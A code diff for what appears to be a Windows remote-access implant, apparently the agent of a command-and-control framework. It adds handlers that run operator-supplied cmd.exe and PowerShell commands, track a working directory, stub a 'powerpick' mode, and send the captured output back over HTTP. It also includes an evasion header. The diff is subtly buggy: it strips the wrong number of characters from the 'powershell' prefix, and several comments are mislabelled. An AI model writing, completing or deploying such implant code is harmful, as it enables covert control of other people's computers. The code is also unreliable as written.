@@ -1,11 +1,13 @@
 #include <iostream>
 #include <vector>
 #include <string>
+#include <codecvt>
 #include "Windows.h"
 #include "wincrypt.h"
 #include "base64.h"
 #include "dependencies.h"
 #include "process.h"
+#include "evasion.h"
 #include "core.h"
 #include "HttpCommunicator.h"
 
@@ -18,6 +20,7 @@
 core* core::instance = NULL;
 bool core::terminated = false;
 int core::sleepTime = 5;
+std::string core::currentPath = "C:\\";
 //Communicator *core::communicator = NULL;
 
 core::core() {
@@ -62,7 +65,7 @@ core::core(std::string identifier) {
 	core::instance = this;
 }
 
-std::string core::execute_command(std::string cmd){
+void core::execute_command(std::string cmd){
 	// Some cases:
 	// "shell " + anything => spawns and executes a CMD.exe command (fork & run)
 	// "powershell " + anything => spawns and executes a POWERSHELL.exe command (fork & run)
@@ -73,22 +76,36 @@ std::string core::execute_command(std::string cmd){
 	if (cmd.rfind("shell ", 0) == 0) {
 		// replace "shell " part
 		cmd = cmd.substr(6, cmd.size() - 6);
-		return this->execute_cmd(cmd);
+		this->execute_cmd(cmd);
 	}
 
-	// execute POWERSHELL.exe
+	if (cmd.rfind("cd ", 0) == 0) {
+		// replace "shell " part
+		cmd = cmd.substr(3, cmd.size() - 3);
+		core::currentPath = cmd;
+	}
+
+	// execute POWERSHELL.exe in another process
 	if (cmd.rfind("powershell ", 0) == 0) {
 		// replace "powershell " part
-		cmd = cmd.substr(11, cmd.size() - 11);
-		return this->execute_powershell(cmd);
+		cmd = cmd.substr(10, cmd.size() - 10);
+		this->execute_powershell(cmd);
 	}
-	return "";
+
+	// execute POWERSHELL.exe in another process
+	if (cmd.rfind("powerpick ", 0) == 0) {
+		// replace "powershell " part
+		cmd = cmd.substr(10, cmd.size() - 10);
+		this->execute_powerpick(cmd);
+	}
+
+	if (cmd == "exit") {
+		core::terminated = true;
+	}
 }
 
-
-std::string core::execute_cmd(std::string cmd) {
-	std::string result = "";
-	std::string fullCommand = "C:\\Windows\\System32\\cmd.exe /c " + cmd;
+void core::execute_cmd(std::string cmd) {
+	std::string fullCommand = "C:\\Windows\\System32\\cmd.exe /c cd " + core::currentPath + "&" + cmd;
 	// we need wide chars for our process creation function
 	std::wstring wideFullCommand = std::wstring(fullCommand.begin(), fullCommand.end());
 	// +1 for the NULL ending char
@@ -99,17 +116,26 @@ std::string core::execute_cmd(std::string cmd) {
 	if (info->stdOutRd) {
 		this->read_pipe(info->stdOutRd);
 	}
-
-	return result;
 }
 
-std::string core::execute_powershell(std::string cmd) {
-	std::string result = "";
+void core::execute_powershell(std::string cmd) {
+	std::string fullCommand = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cd " + core::currentPath + ";" + cmd;
 
-	return result;
-
+	// we need wide chars for our process creation function
+	std::wstring wideFullCommand = std::wstring(fullCommand.begin(), fullCommand.end());
+	// +1 for the NULL ending char
+	wchar_t* genericFullCommand = (wchar_t*)malloc(sizeof(wchar_t) * wideFullCommand.size() + 1);
+	wcscpy_s(genericFullCommand, wideFullCommand.size() + 1, wideFullCommand.c_str());
+	PROCESS_INFO* info = process::create_process(genericFullCommand);
+	// to read from pipe
+	if (info->stdOutRd) {
+		this->read_pipe(info->stdOutRd);
+	}
 }
 
+void core::execute_powerpick(std::string cmd) {
+	// NOT IMPLEMENTED
+}
 bool invalidChar(char c)
 {
 	return !(c >= 0 && c < 128);
@@ -141,5 +167,6 @@ void core::read_pipe(HANDLE rdPipe) {
 	completeResult.erase(remove_if(completeResult.begin(), completeResult.end(), invalidChar), completeResult.end());
 
 	// we will assume HTTP always for now
-	HttpCommunicator::communicator->send_output(completeResult);
+	if(HttpCommunicator::communicator)
+		HttpCommunicator::communicator->send_output(completeResult);
 }
